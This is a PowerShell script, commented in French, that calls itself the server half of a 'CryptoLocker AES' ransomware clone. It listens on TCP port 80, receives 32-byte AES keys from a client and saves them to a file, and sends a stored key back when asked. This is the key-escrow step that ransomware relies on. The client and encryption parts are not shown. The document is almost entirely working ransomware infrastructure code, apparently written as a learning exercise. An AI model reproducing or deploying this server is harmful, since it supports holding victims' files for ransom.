## CryptoLocker AES Serveur
########################################################################
## Pour tester le programme en local, lancer le client sur un autre IDE. 
## (PowerGUI ou PowerShell ISE ne permettent pas le lancement de deux
## scripts en même temps)
## Le Serveur attend une connection du client pour le stockage ou la
## l'envoi de la clé de chiffrement.
#
#	   __  coincoin !
#	 >(^ )___
#	  ( ._> /
#	   `---'   HRN
########################################################################

# Ouverture du socket tcp
$endpoint = New-Object System.Net.IPEndPoint ([System.net.ipaddress]::any, 80)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
# Ecoute en attente d'une connection
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
Write-Host "Connected"
$buffer = New-Object System.Byte[] 2048
$encoding = New-Object System.Text.ASCIIEncoding
$received = $false

# réception des données
while (-not $received)
{
    if ($stream.DataAvailable)
    {
        Write-Host "Data received"
        $rawdata = $stream.Read($buffer, 0, $buffer.Length)
        $data = $encoding.GetString($buffer, 0, $rawdata)
		# demande d'envoi de la clé
        if ($data -eq "Get key") {
            Write-Host "send key"
            $key = Get-Content "$env:userprofile\key.txt"
            $data = $encoding.GetBytes($key)
            $Stream.Write($data, 0, $data.Length)
            $Stream.Flush()
            $received = $true
        }else{
			# demande de récpetion de la clé
            [Byte[]]$key = $data.Split()
            if ($key.Length -eq 32){
                Write-Host "Key received"
                $data = $encoding.GetBytes("Key received")
                $Stream.Write($data, 0, $data.Length)
                $Stream.Flush()
                $received = $true
                $key | Set-Content "C:\Users\f.henrion1\Documents\DEV_PERSO\key.txt"
            }else{
                Write-Host "Error Key not valid"
            }
        }
        
    }
    Start-Sleep -Milliseconds 500
}
$stream.Close()
$client.Close()
$listener.Stop()